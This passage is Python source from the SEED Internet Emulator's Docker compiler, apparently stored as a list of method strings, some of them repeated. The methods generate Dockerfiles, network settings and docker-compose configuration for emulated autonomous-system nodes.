labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n                key = 'net.{}.address'.format(n),\n                value = '{}/{}'.format(iface.getAddress(), net.getPrefix().prefixlen)\n            )\n\n            n += 1\n\n        return labels\n\n    def _nodeRoleToString(self, role: NodeRole):\n        \"\"\"!\n        @brief convert node role to prefix string\n\n        @param role node role\n\n        @returns prefix string\n        \"\"\"\n        if role == NodeRole.Host: return 'h'\n        if role == NodeRole.Router: return 'r'\n        if role == NodeRole.RouteServer: return 'rs'\n        assert False, 'unknown node role {}'.format(role)\n\n    def _contextToPrefix(self, scope: str, type: str) -> str:\n        \"\"\"!\n        @brief Convert context to prefix.\n\n        @param scope scope.\n        @param type type.\n\n        @returns prefix string.\n        \"\"\"\n        return '{}_{}_'.format(type, scope)\n\n    def _addFile(self, path: str, content: str) -> str:\n        \"\"\"!\n        @brief Stage file to local folder and return Dockerfile command.\n\n        @param path path to file. (in container)\n        @param content content of the file.\n\n        @returns COPY expression for dockerfile.\n        \"\"\"\n\n        staged_path = md5(path.encode('utf-8')).hexdigest()\n        print(content, file=open(staged_path, 'w'))\n        return 'COPY {} {}\\n'.format(staged_path, path)\n\n    def _importFile(self, path: str, hostpath: str) -> str:\n        \"\"\"!\n        @brief Stage file to local folder and return Dockerfile command.\n\n        @param path path to file. (in container)\n        @param hostpath path to file. (on host)\n\n        @returns COPY expression for dockerfile.\n        \"\"\"\n\n        staged_path = md5(path.encode('utf-8')).hexdigest()\n        copyfile(hostpath, staged_path)\n        return 'COPY {} {}\\n'.format(staged_path, path)\n\n    def _compileNode(self, node: Node) -> str:\n        \"\"\"!\n        @brief Compile a single node. Will create folder for node and the\n        dockerfile.\n\n        @param node node to compile.\n\n        @returns docker-compose service string.\n        \"\"\"\n        (scope, type, _) = node.getRegistryInfo()\n        prefix = self._contextToPrefix(scope, type)\n        real_nodename = '{}{}'.format(prefix, node.getName())\n        node_nets = ''\n        dummy_addr_map = ''\n\n        for iface in node.getInterfaces():\n            net = iface.getNet()\n            (netscope, _, _) = net.getRegistryInfo()\n            net_prefix = self._contextToPrefix(netscope, 'net')\n            if net.getType() == NetworkType.Bridge: net_prefix = ''\n            real_netname = '{}{}'.format(net_prefix, net.getName())\n            address = iface.getAddress()\n\n            if self.__self_managed_network and net.getType() != NetworkType.Bridge:\n                d_index: int = net.getAttribute('dummy_prefix_index')\n                d_prefix: IPv4Network = net.getAttribute('dummy_prefix')\n                d_address: IPv4Address = d_prefix[d_index]\n\n                net.setAttribute('dummy_prefix_index', d_index + 1)\n\n                dummy_addr_map += '{}/{},{}/{}\\n'.format(\n                    d_address, d_prefix.prefixlen,\n                    iface.getAddress(), iface.getNet().getPrefix().prefixlen\n                )\n\n                address = d_address\n\n                self._log('using self-managed network: using dummy address {}/{} for {}/{} on as{}/{}'.format(\n                    d_address, d_prefix.prefixlen, iface.getAddress(), iface.getNet().getPrefix().prefixlen,\n                    node.getAsn(), node.getName()\n                ))\n\n            if address == None:\n                address = \"\"\n            else:\n                address = DockerCompilerFileTemplates['compose_service_network_address'].format(address = address)\n\n            node_nets += DockerCompilerFileTemplates['compose_service_network'].format(\n                netId = real_netname,\n                address = address\n            )\n\n        _ports = node.getPorts()\n        ports = ''\n        if len(_ports) > 0:\n            lst = ''\n            for (h, n, p) in _ports:\n                lst += DockerCompilerFileTemplates['compose_port'].format(\n                    hostPort = h,\n                    nodePort = n,\n                    proto = p\n                )\n            ports = DockerCompilerFileTemplates['compose_ports'].format(\n                portList = lst\n            )\n\n        _volumes = node.getSharedFolders()\n        storages = node.getPersistentStorages()\n\n        volumes = ''\n\n        if len(_volumes) > 0 or len(storages) > 0:\n            lst = ''\n\n            for (nodePath, hostPath) in _volumes.items():\n                lst += DockerCompilerFileTemplates['compose_volume'].format(\n                    hostPath = hostPath,\n                    nodePath = nodePath\n                )\n\n            for path in storages:\n                lst += DockerCompilerFileTemplates['compose_storage'].format(\n                    nodePath = path\n                )\n\n            volumes = DockerCompilerFileTemplates['compose_volumes'].format(\n                volumeList = lst\n            )\n\n        dockerfile = DockerCompilerFileTemplates['dockerfile']\n        mkdir(real_nodename)\n        chdir(real_nodename)\n\n        (image, soft) = self._selectImageFor(node)\n\n        if not node.hasAttribute('__soft_install_tiers') and len(soft) > 0:\n            dockerfile += 'RUN apt-get update && apt-get install -y --no-install-recommends {}\\n'.format(' '.join(sorted(soft)))\n\n        if node.hasAttribute('__soft_install_tiers'):\n            softLists: List[List[str]] = node.getAttribute('__soft_install_tiers')\n            for softList in softLists:\n                softList = set(softList) & soft\n                if len(softList) == 0: continue\n                dockerfile += 'RUN apt-get update && apt-get install -y --no-install-recommends {}\\n'.format(' '.join(sorted(softList)))\n\n        #included in the seedemu-base dockerImage.\n        #dockerfile += 'RUN curl -L https://grml.org/zsh/zshrc > /root/.zshrc\\n'\n        dockerfile = 'FROM {}\\n'.format(md5(image.getName().encode('utf-8')).hexdigest()) + dockerfile\n        self._used_images.add(image.getName())\n\n        for cmd in node.getBuildCommands(): dockerfile += 'RUN {}\\n'.format(cmd)\n\n        start_commands = ''\n\n        if self.__self_managed_network:\n            start_commands += 'chmod +x /replace_address.sh\\n'\n            start_commands += '/replace_address.sh\\n'\n            dockerfile += self._addFile('/replace_address.sh', DockerCompilerFileTemplates['replace_address_script'])\n            dockerfile += self._addFile('/dummy_addr_map.txt', dummy_addr_map)\n            dockerfile += self._addFile('/root/.zshrc.pre', DockerCompilerFileTemplates['zshrc_pre'])\n\n        for (cmd, fork) in node.getStartCommands():\n            start_commands += '{}{}\\n'.format(cmd, ' &' if fork else '')\n\n        dockerfile += self._addFile('/start.sh', DockerCompilerFileTemplates['start_script'].format(\n            startCommands = start_commands\n        ))\n\n        dockerfile += self._addFile('/seedemu_sniffer', DockerCompilerFileTemplates['seedemu_sniffer'])\n        dockerfile += self._addFile('/seedemu_worker', DockerCompilerFileTemplates['seedemu_worker'])\n\n        dockerfile += 'RUN chmod +x /start.sh\\n'\n        dockerfile += 'RUN chmod +x /seedemu_sniffer\\n'\n        dockerfile += 'RUN chmod +x /seedemu_worker\\n'\n\n        for file in node.getFiles():\n            (path, content) = file.get()\n            dockerfile += self._addFile(path, content)\n\n        for (cpath, hpath) in node.getImportedFiles().items():\n            dockerfile += self._importFile(cpath, hpath)\n\n        dockerfile += 'CMD [\"/start.sh\"]\\n'\n        print(dockerfile, file=open('Dockerfile', 'w'))\n\n        chdir('..')\n\n        name = self.__naming_scheme.format(\n            asn = node.getAsn(),\n            role = self._nodeRoleToString(node.getRole()),\n            name = node.getName(),\n            displayName = node.getDisplayName() if node.getDisplayName() != None else node.getName(),\n            primaryIp = node.getInterfaces()[0].getAddress()\n        )\n\n        name = sub(r'[^a-zA-Z0-9_.-]', '_', name)\n\n        return DockerCompilerFileTemplates['compose_service'].format(\n            nodeId = real_nodename,\n            nodeName = name,\n            dependsOn = md5(image.getName().encode('utf-8')).hexdigest(),\n            networks = node_nets,\n            # privileged = 'true' if node.isPrivileged() else 'false',\n            ports = ports,\n            labelList = self._getNodeMeta(node),\n            volumes = volumes\n        )\n\n    def _compileNet(self, net: Network) -> str:\n        \"\"\"!\n        @brief compile a network.\n\n        @param net net object.\n\n        @returns docker-compose network string.\n        \"\"\"\n        (scope, _, _) = net.getRegistryInfo()\n        if self.__self_managed_network and net.getType() != NetworkType.Bridge:\n            pfx = next(self.__dummy_network_pool)\n            net.setAttribute('dummy_prefix', pfx)\n            net.setAttribute('dummy_prefix_index', 2)\n            self._log('self-managed network: using dummy prefix {}'.format(pfx))\n\n        net_prefix = self._contextToPrefix(scope, 'net')\n        if net.getType() == NetworkType.Bridge: net_prefix = ''\n\n        return DockerCompilerFileTemplates['compose_network'].format(\n            netId = '{}{}'.format(net_prefix, net.getName()),\n            prefix = net.getAttribute('dummy_prefix') if self.__self_managed_network and net.getType() != NetworkType.Bridge else net.getPrefix(),\n            mtu = net.getMtu(),\n            labelList = self._getNetMeta(net)\n        )\n\n    def _makeDummies(self) -> str:\n        \"\"\"!\n        @brief create dummy services to get around docker pull limits.\n\n        @returns docker-compose service string.\n        \"\"\"\n        mkdir('dummies')\n        chdir('dummies')\n\n        dummies = ''\n\n        for image in self._used_images:\n            self._log('adding dummy service for image {}...'.format(image))\n\n            imageDigest = md5(image.encode('utf-8')).hexdigest()\n\n            dummies += DockerCompilerFileTemplates['compose_dummy'].format(\n                imageDigest = imageDigest\n            )\n\n            dockerfile = 'FROM {}\\n'.format(image)\n            print(dockerfile, file=open(imageDigest, 'w'))\n\n        chdir('..')\n\n        return dummies\n\n    def _doCompile(self, emulator: Emulator):\n        registry = emulator.getRegistry()\n\n        self._groupSoftware(emulator)\n\n        for ((scope, type, name), obj) in registry.getAll().items():\n\n            if type == 'net':\n                self._log('creating network: {}/{}...'.format(scope, name))\n                self.__networks += self._compileNet(obj)\n\n        for ((scope, type, name), obj) in registry.getAll().items():\n            if type == 'rnode':\n                self._log('compiling router node {} for as{}...'.format(name, scope))\n                self.__services += self._compileNode(obj)\n\n            if type == 'csnode':\n                self._log('compiling control service node {} for as{}...'.format(name, scope))\n                self.__services += self._compileNode(obj)\n\n            if type == 'hnode':\n                self._log('compiling host node {} for as{}...'.format(name, scope))\n                self.__services += self._compileNode(obj)\n\n            if type == 'rs':\n                self._log('compiling rs node for {}...'.format(name))\n                self.__services += self._compileNode(obj)\n\n            if type == 'snode':\n                self._log('compiling service node {}...'.format(name))\n                self.__services += self._compileNode(obj)\n\n        if self.__internet_map_enabled:\n            self._log('enabling seedemu-internet-map...')\n\n            self.__services += DockerCompilerFileTemplates['seedemu_internet_map'].format(\n                clientImage = SEEDEMU_INTERNET_MAP_IMAGE,\n                clientPort = self.__internet_map_port\n            )\n\n        if self.__ether_view_enabled:\n            self._log('enabling seedemu-ether-view...')\n\n            self.__services += DockerCompilerFileTemplates['seedemu_ether_view'].format(\n                clientImage = SEEDEMU_ETHER_VIEW_IMAGE,\n                clientPort = self.__ether_view_port\n            )\n\n        local_images = ''\n\n        for (image, _) in self.__images.values():\n            if image.getName() not in self._used_images or not image.isLocal(): continue\n            local_images += DockerCompilerFileTemplates['local_image'].format(\n                imageName = image.getName(),\n                dirName = image.getDirName()\n            )\n\n        self._log('creating docker-compose.yml...'.format(scope, name))\n        print(DockerCompilerFileTemplates['compose'].format(\n            services = self.__services,\n            networks = self.__networks,\n            dummies = local_images + self._makeDummies()\n        ), file=open('docker-compose.yml', 'w'))",
  "def __init__(\n        self,\n        namingScheme: str = \"as{asn}{role}-{displayName}-{primaryIp}\",\n        selfManagedNetwork: bool = False,\n        dummyNetworksPool: str = '10.128.0.0/9',\n        dummyNetworksMask: int = 24,\n        internetMapEnabled: bool = False,\n        internetMapPort: int = 8080,\n        etherViewEnabled: bool = False,\n        etherViewPort: int = 5000,\n        clientHideServiceNet: bool = True\n    ):\n        \"\"\"!\n        @brief Docker compiler constructor.\n\n        @param namingScheme (optional) node naming scheme. Available variables\n        are: {asn}, {role} (r - router, h - host, rs - route server), {name},\n        {primaryIp} and {displayName}. {displayName} will automatically fall\n        back to {name} if\n        Default to as{asn}{role}-{displayName}-{primaryIp}.\n        @param selfManagedNetwork (optional) use self-managed network. Enable\n        this to manage the network inside containers instead of using docker's\n        network management. This works by first assigning \"dummy\" prefix and\n        address to containers, then replace those address with \"real\" address\n        when the containers start. This will allow the use of overlapping\n        networks in the emulation and will allow the use of the \".1\" address on\n        nodes. Note this will break port forwarding (except for service nodes\n        like real-world access node and remote access node.) Default to False.\n        @param dummyNetworksPool (optional) dummy networks pool. This should not\n        overlap with any \"real\" networks used in the emulation, including\n        loopback IP addresses. Default to 10.128.0.0/9.\n        @param dummyNetworksMask (optional) mask of dummy networks. Default to\n        24.\n        @param internetMapEnabled (optional) set if seedemu internetMap should be enabled.\n        Default to False. Note that the seedemu internetMap allows unauthenticated\n        access to all nodes, which can potentially allow root access to the\n        emulator host. Only enable seedemu in a trusted network.\n        @param internetMapPort (optional) set seedemu internetMap port. Default to 8080.\n        @param etherViewEnabled (optional) set if seedemu EtherView should be enabled.\n        Default to False.\n        @param etherViewPort (optional) set seedemu EtherView port. Default to 5000.\n        @param clientHideServiceNet (optional) hide service network for the\n        client map by not adding metadata on the net. Default to True.\n        \"\"\"\n        self.__networks = \"\"\n        self.__services = \"\"\n        self.__naming_scheme = namingScheme\n        self.__self_managed_network = selfManagedNetwork\n        self.__dummy_network_pool = IPv4Network(dummyNetworksPool).subnets(new_prefix = dummyNetworksMask)\n\n        self.__internet_map_enabled = internetMapEnabled\n        self.__internet_map_port = internetMapPort\n\n        self.__ether_view_enabled = etherViewEnabled\n        self.__ether_view_port = etherViewPort\n\n        self.__client_hide_svcnet = clientHideServiceNet\n\n        self.__images = {}\n        self.__forced_image = None\n        self.__disable_images = False\n        self._used_images = set()\n        self.__image_per_node_list = {}\n\n        for name, image in BASESYSTEM_DOCKERIMAGE_MAPPING.items():\n            priority = 0\n            if name == BaseSystem.DEFAULT:\n                priority = 1\n            self.addImage(image, priority=priority)",
  "def getName(self) -> str:\n        return \"Docker\"",
  "def addImage(self, image: DockerImage, priority: int = -1) -> Docker:\n        \"\"\"!\n        @brief add an candidate image to the compiler.\n\n        @param image image to add.\n        @param priority (optional) priority of this image. Used when one or more\n        images with same number of missing software exist. The one with highest\n        priority wins. If two or more images with same priority and same number\n        of missing software exist, the one added the last will be used. All\n        built-in images has priority of 0. Default to -1. All built-in images are\n        prior to the added candidate image. To set a candidate image to a node,\n        use setImageOverride() method.\n\n        @returns self, for chaining api calls.\n        \"\"\"\n        assert image.getName() not in self.__images, 'image with name {} already exists.'.format(image.getName())\n\n        self.__images[image.getName()] = (image, priority)\n\n        return self",
  "def getImages(self) -> List[Tuple[DockerImage, int]]:\n        \"\"\"!\n        @brief get list of images configured.\n\n        @returns list of tuple of images and priority.\n        \"\"\"\n\n        return list(self.__images.values())",
  "def forceImage(self, imageName: str) -> Docker:\n        \"\"\"!\n        @brief forces the docker compiler to use a image, identified by the\n        imageName. Image with such name must be added to the docker compiler\n        with the addImage method, or the docker compiler will fail at compile\n        time. Set to None to disable the force behavior.\n\n        @param imageName name of the image.\n\n        @returns self, for chaining api calls.\n        \"\"\"\n        self.__forced_image = imageName\n\n        return self",
  "def disableImages(self, disabled: bool = True) -> Docker:\n        \"\"\"!\n        @brief forces the docker compiler to not use any images and build\n        everything for starch. Set to False to disable the behavior.\n\n        @param disabled (option) disabled image if True. Default to True.\n\n        @returns self, for chaining api calls.\n        \"\"\"\n        self.__disable_images = disabled\n\n        return self",
  "def setImageOverride(self, node:Node, imageName:str) -> Docker:\n        \"\"\"!\n        @brief set the docker compiler to use a image on the specified Node.\n\n        @param node target node to override image.\n        @param imageName name of the image to use.\n\n        @returns self, for chaining api calls.\n        \"\"\"\n        asn = node.getAsn()\n        name = node.getName()\n        self.__image_per_node_list[(asn, name)]=imageName",
  "def _groupSoftware(self, emulator: Emulator):\n        \"\"\"!\n        @brief Group apt-get install calls to maximize docker cache.\n\n        @param emulator emulator to load nodes from.\n        \"\"\"\n\n        registry = emulator.getRegistry()\n\n        # { [imageName]: { [softName]: [nodeRef] } }\n        softGroups: Dict[str, Dict[str, List[Node]]] = {}\n\n        # { [imageName]: useCount }\n        groupIter: Dict[str, int] = {}\n\n        for ((scope, type, name), obj) in registry.getAll().items():\n            if type not in ['rnode', 'csnode', 'hnode', 'snode', 'rs', 'snode']:\n                continue\n\n            node: Node = obj\n\n            (img, _) = self._selectImageFor(node)\n            imgName = img.getName()\n\n            if not imgName in groupIter:\n                groupIter[imgName] = 0\n\n            groupIter[imgName] += 1\n\n            if not imgName in softGroups:\n                softGroups[imgName] = {}\n\n            group = softGroups[imgName]\n\n            for soft in node.getSoftware():\n                if soft not in group:\n                    group[soft] = []\n                group[soft].append(node)\n\n        for (key, val) in softGroups.items():\n            maxIter = groupIter[key]\n            self._log('grouping software for image \"{}\" - {} references.'.format(key, maxIter))\n            step = 1\n\n            for commRequired in range(maxIter, 0, -1):\n                currentTier: Set[str] = set()\n                currentTierNodes: Set[Node] = set()\n\n                for (soft, nodes) in val.items():\n                    if len(nodes) == commRequired:\n                        currentTier.add(soft)\n                        for node in nodes: currentTierNodes.add(node)\n\n                for node in currentTierNodes:\n                    if not node.hasAttribute('__soft_install_tiers'):\n                        node.setAttribute('__soft_install_tiers', [])\n\n                    node.getAttribute('__soft_install_tiers').append(currentTier)\n\n\n                if len(currentTier) > 0:\n                    self._log('the following software has been grouped together in step {}: {} since they are referenced by {} nodes.'.format(step, currentTier, len(currentTierNodes)))\n                    step += 1",
  "def _selectImageFor(self, node: Node) -> Tuple[DockerImage, Set[str]]:\n        \"\"\"!\n        @brief select image for the given node.\n\n        @param node node.\n\n        @returns tuple of selected image and set of missing software.\n        \"\"\"\n        nodeSoft = node.getSoftware()\n        nodeKey = (node.getAsn(), node.getName())\n\n        # #1 Highest Priority (User Custom Image)\n        if nodeKey in self.__image_per_node_list:\n            image_name = self.__image_per_node_list[nodeKey]\n\n            assert image_name in self.__images, 'image-per-node configured, but image {} does not exist.'.format(image_name)\n\n            (image, _) = self.__images[image_name]\n\n            self._log('image-per-node configured, using {}'.format(image.getName()))\n            return (image, nodeSoft - image.getSoftware())\n\n        # Should we keep this feature?\n        if self.__disable_images:\n            self._log('disable-imaged configured, using base image.')\n            (image, _) = self.__images['ubuntu:20.04']\n            return (image, nodeSoft - image.getSoftware())\n\n        # Set Default Image for All Nodes\n        if self.__forced_image != None:\n            assert self.__forced_image in self.__images, 'forced-image configured, but image {} does not exist.'.format(self.__forced_image)\n\n            (image, _) = self.__images[self.__forced_image]\n\n            self._log('force-image configured, using image: {}'.format(image.getName()))\n\n            return (image, nodeSoft - image.getSoftware())\n            \n        #Maintain a table : Virtual Image Name - Actual Image Name \n        image = BASESYSTEM_DOCKERIMAGE_MAPPING[node.getBaseSystem()]\n\n        return (image, nodeSoft - image.getSoftware())",
  "def _getNetMeta(self, net: Network) -> str:\n        \"\"\"!\n        @brief get net metadata labels.\n\n        @param net net object.\n\n        @returns metadata labels string.\n        \"\"\"\n\n        (scope, type, name) = net.getRegistryInfo()\n\n        labels = ''\n\n        if self.__client_hide_svcnet and scope == 'seedemu' and name == '000_svc':\n            return DockerCompilerFileTemplates['compose_label_meta'].format(\n                key = 'dummy',\n                value = 'dummy label for hidden node/net'\n            )\n\n        labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n            key = 'type',\n            value = 'global' if scope == 'ix' else 'local'\n        )\n\n        labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n            key = 'scope',\n            value = scope\n        )\n\n        labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n            key = 'name',\n            value = name\n        )\n\n        labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n            key = 'prefix',\n            value = net.getPrefix()\n        )\n\n        if net.getDisplayName() != None:\n            labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n                key = 'displayname',\n                value = net.getDisplayName()\n            )\n\n        if net.getDescription() != None:\n            labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n                key = 'description',\n                value = net.getDescription()\n            )\n\n        return labels",
  "def _getNodeMeta(self, node: Node) -> str:\n        \"\"\"!\n        @brief get node metadata labels.\n\n        @param node node object.\n\n        @returns metadata labels string.\n        \"\"\"\n        (scope, type, name) = node.getRegistryInfo()\n\n        labels = ''\n\n        labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n            key = 'asn',\n            value = node.getAsn()\n        )\n\n        labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n            key = 'nodename',\n            value = name\n        )\n\n        if type == 'hnode':\n            labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n                key = 'role',\n                value = 'Host'\n            )\n\n        if type == 'rnode':\n            labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n                key = 'role',\n                value = 'Router'\n            )\n\n        if type == 'csnode':\n            labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n                key = 'role',\n                value = 'SCION Control Service'\n            )\n\n        if type == 'snode':\n            labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n                key = 'role',\n                value = 'Emulator Service Worker'\n            )\n\n        if type == 'rs':\n            labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n                key = 'role',\n                value = 'Route Server'\n            )\n\n        if node.getDisplayName() != None:\n            labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n                key = 'displayname',\n                value = node.getDisplayName()\n            )\n\n        if node.getDescription() != None:\n            labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n                key = 'description',\n                value = node.getDescription()\n            )\n\n        if len(node.getClasses()) > 0:\n            labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n                key = 'class',\n                value = json.dumps(node.getClasses()).replace(\"\\\"\", \"\\\\\\\"\")\n            )\n\n        for key, value in node.getLabel().items():\n            labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n                key = key,\n                value = value\n            )\n        n = 0\n        for iface in node.getInterfaces():\n            net = iface.getNet()\n\n            labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n                key = 'net.{}.name'.format(n),\n                value = net.getName()\n            )\n\n            labels += DockerCompilerFileTemplates['compose_label_meta'].format(\n                key = 'net.{}.address'.format(n),\n                value = '{}/{}'.format(iface.getAddress(), net.getPrefix().prefixlen)\n            )\n\n            n += 1\n\n        return labels",
  "def _nodeRoleToString(self, role: NodeRole):\n        \"\"\"!\n        @brief convert node role to prefix string\n\n        @param role node role\n\n        @returns prefix string\n        \"\"\"\n        if role == NodeRole.Host: return 'h'\n        if role == NodeRole.Router: return 'r'\n        if role == NodeRole.RouteServer: return 'rs'\n        assert False, 'unknown node role {}'.format(role)",
  "def _contextToPrefix(self, scope: str, type: str) -> str:\n        \"\"\"!\n        @brief Convert context to prefix.\n\n        @param scope scope.\n        @param type type.\n\n        @returns prefix string.\n        \"\"\"\n        return '{}_{}_'.format(type, scope)",
  "def _addFile(self, path: str, content: str) -> str:\n        \"\"\"!\n        @brief Stage file to local folder and return Dockerfile command.\n\n        @param path path to file. (in container)\n        @param content content of the file.\n\n        @returns COPY expression for dockerfile.\n        \"\"\"\n\n        staged_path = md5(path.encode('utf-8')).hexdigest()\n        print(content, file=open(staged_path, 'w'))\n        return 'COPY {} {}\\n'.format(staged_path, path)",
  "def _importFile(self, path: str, hostpath: str) -> str:\n        \"\"\"!\n        @brief Stage file to local folder and return Dockerfile command.\n\n        @param path path to file. (in container)\n        @param hostpath path to file. (on host)\n\n        @returns COPY expression for dockerfile.\n        \"\"\"\n\n        staged_path = md5(path.encode('utf-8')).hexdigest()\n        copyfile(hostpath, staged_path)\n        return 'COPY {} {}\\n'.format(staged_path, path)",
  "def _compileNode(self, node: Node) -> str:\n        \"\"\"!\n        @brief Compile a single node. Will create folder for node and the\n        dockerfile.\n\n        @param node node to compile.\n\n        @returns docker-compose service string.\n        \"\"\"\n        (scope, type, _) = node.getRegistryInfo()\n        prefix = self._contextToPrefix(scope, type)\n        real_nodename = '{}{}'.format(prefix, node.getName())\n        node_nets = ''\n        dummy_addr_map = ''\n\n        for iface in node.getInterfaces():\n            net = iface.getNet()\n            (netscope, _, _) = net.getRegistryInfo()\n            net_prefix = self._contextToPrefix(netscope, 'net')\n            if net.getType() == NetworkType.Bridge: net_prefix = ''\n            real_netname = '{}{}'.format(net_prefix, net.getName())\n            address = iface.getAddress()\n\n            if self.__self_managed_network and net.getType() != NetworkType.Bridge:\n                d_index: int = net.getAttribute('dummy_prefix_index')\n                d_prefix: IPv4Network = net.getAttribute('dummy_prefix')\n                d_address: IPv4Address = d_prefix[d_index]\n\n                net.setAttribute('dummy_prefix_index', d_index + 1)\n\n                dummy_addr_map += '{}/{},{}/{}\\n'.format(\n                    d_address, d_prefix.prefixlen,\n                    iface.getAddress(), iface.getNet().getPrefix().prefixlen\n                )\n\n                address = d_address\n\n                self._log('using self-managed network: using dummy address {}/{} for {}/{} on as{}/{}'.format(\n                    d_address, d_prefix.prefixlen, iface.getAddress(), iface.getNet().getPrefix().prefixlen,\n                    node.getAsn(), node.getName()\n                ))\n\n            if address == None:\n                address = \"\"\n            else:\n                address = DockerCompilerFileTemplates['compose_service_network_address'].format(address = address)\n\n            node_nets += DockerCompilerFileTemplates['compose_service_network'].format(\n                netId = real_netname,\n                address = address\n            )\n\n        _ports = node.getPorts()\n        ports = ''\n        if len(_ports) > 0:\n            lst = ''\n            for (h, n, p) in _ports:\n                lst += DockerCompilerFileTemplates['compose_port'].format(\n                    hostPort = h,\n                    nodePort = n,\n                    proto = p\n                )\n            ports = DockerCompilerFileTemplates['compose_ports'].format(\n                portList = lst\n            )\n\n        _volumes = node.getSharedFolders()\n        storages = node.getPersistentStorages()\n\n        volumes = ''\n\n        if len(_volumes) > 0 or len(storages) > 0:\n            lst = ''\n\n            for (nodePath, hostPath) in _volumes.items():\n                lst += DockerCompilerFileTemplates['compose_volume'].format(\n                    hostPath = hostPath,\n                    nodePath = nodePath\n                )\n\n            for path in storages:\n                lst += DockerCompilerFileTemplates['compose_storage'].format(\n                    nodePath = path\n                )\n\n            volumes = DockerCompilerFileTemplates['compose_volumes'].format(\n                volumeList = lst\n            )\n\n        dockerfile = DockerCompilerFileTemplates['dockerfile']\n        mkdir(real_nodename)\n        chdir(real_nodename)\n\n        (image, soft) = self._selectImageFor(node)\n\n        if not node.hasAttribute('__soft_install_tiers') and len(soft) > 0:\n            dockerfile += 'RUN apt-get update && apt-get install -y --no-install-recommends {}\\n'.format(' '.join(sorted(soft)))\n\n        if node.hasAttribute('__soft_install_tiers'):\n            softLists: List[List[str]] = node.getAttribute('__soft_install_tiers')\n            for softList in softLists:\n                softList = set(softList) & soft\n                if len(softList) == 0: continue\n                dockerfile += 'RUN apt-get update && apt-get install -y --no-install-recommends {}\\n'.format(' '.join(sorted(softList)))\n\n        #included in the seedemu-base dockerImage.\n        #dockerfile += 'RUN curl -L https://grml.org/zsh/zshrc > /root/.zshrc\\n'\n        dockerfile = 'FROM {}\\n'.format(md5(image.getName().encode('utf-8')).hexdigest()) + dockerfile\n        self._used_images.add(image.getName())\n\n        for cmd in node.getBuildCommands(): dockerfile += 'RUN {}\\n'.format(cmd)\n\n        start_commands = ''\n\n        if self.__self_managed_network:\n            start_commands += 'chmod +x /replace_address.sh\\n'\n            start_commands += '/replace_address.sh\\n'\n            dockerfile += self._addFile('/replace_address.sh', DockerCompilerFileTemplates['replace_address_script'])\n            dockerfile += self._addFile('/dummy_addr_map.txt', dummy_addr_map)\n            dockerfile += self._addFile('/root/.zshrc.pre', DockerCompilerFileTemplates['zshrc_pre'])\n\n        for (cmd, fork) in node.getStartCommands():\n            start_commands += '{}{}\\n'.format(cmd, ' &' if fork else '')\n\n        dockerfile += self._addFile('/start.sh', DockerCompilerFileTemplates['start_script'].format(\n            startCommands = start_commands\n        ))\n\n        dockerfile += self._addFile('/seedemu_sniffer', DockerCompilerFileTemplates['seedemu_sniffer'])\n        dockerfile += self._addFile('/seedemu_worker', DockerCompilerFileTemplates['seedemu_worker'])\n\n        dockerfile += 'RUN chmod +x /start.sh\\n'\n        dockerfile += 'RUN chmod +x /seedemu_sniffer\\n'\n        dockerfile += 'RUN chmod +x /seedemu_worker\\n'\n\n        for file in node.getFiles():\n            (path, content) = file.get()\n            dockerfile += self._addFile(path, content)\n\n        for (cpath, hpath) in node.getImportedFiles().items():\n            dockerfile += self._importFile(cpath, hpath)\n\n        dockerfile += 'CMD [\"/start.sh\"]\\n'\n        print(dockerfile, file=open('Dockerfile', 'w'))\n\n        chdir('..')\n\n        name = self.__naming_scheme.format(\n            asn = node.getAsn(),\n            role = self._nodeRoleToString(node.getRole()),\n            name = node.getName(),\n            displayName = node.getDisplayName() if node.getDisplayName() != None else node.getName(),\n            primaryIp = node.getInterfaces()[0].getAddress()\n        )\n\n        name = sub(r'[^a-zA-Z0-9_.-]', '_', name)\n\n        return DockerCompilerFileTemplates['compose_service'].format(\n            nodeId = real_nodename,\n            nodeName = name,\n            dependsOn = md5(image.getName().encode('utf-8')).hexdigest(),\n            networks = node_nets,\n            # privileged = 'true' if node.isPrivileged() else 'false',\n            ports = ports,\n            labelList = self._getNodeMeta(node),\n            volumes = volumes\n        )",
  "def _compileNet(self, net: Network) -> str:\n        \"\"\"!\n        @brief compile a network.\n\n        @param net net object.\n\n        @returns docker-compose network string.\n        \"\"\"\n        (scope, _, _) = net.getRegistryInfo()\n        if self.__self_managed_network and net.getType() != NetworkType.Bridge:\n            pfx = next(self.__dummy_network_pool)\n            net.setAttribute('dummy_prefix', pfx)\n            net.setAttribute('dummy_prefix_index', 2)\n            self._log('self-managed network: using dummy prefix {}'.format(pfx))\n\n        net_prefix = self._contextToPrefix(scope, 'net')\n        if net.getType() == NetworkType.Bridge: net_prefix = ''\n\n        return DockerCompilerFileTemplates['compose_network'].format(\n            netId = '{}{}'.format(net_prefix, net.getName()),\n            prefix = net.getAttribute('dummy_prefix') if self.__self_managed_network and net.getType() != NetworkType.Bridge else net.getPrefix(),\n            mtu = net.getMtu(),\n            labelList = self._getNetMeta(net)\n        )",
  "def _makeDummies(self) -> str:\n        \"\"\"!\n        @brief create dummy services to get around docker pull limits.\n\n        @returns docker-compose service string.\n        \"\"\"\n        mkdir('dummies')\n        chdir('dummies')\n\n        dummies = ''\n\n        for image in self._used_images:\n            self._log('adding dummy service for image {}...'.format(image))\n\n            imageDigest = md5(image.encode('utf-8')).hexdigest()\n\n            dummies += DockerCompilerFileTemplates['compose_dummy'].format(\n                imageDigest = imageDigest\n            )\n\n            dockerfile = 'FROM {}\\n'.format(image)\n            print(dockerfile, file=open(imageDigest, 'w'))\n\n        chdir('..')\n\n        return dummies",
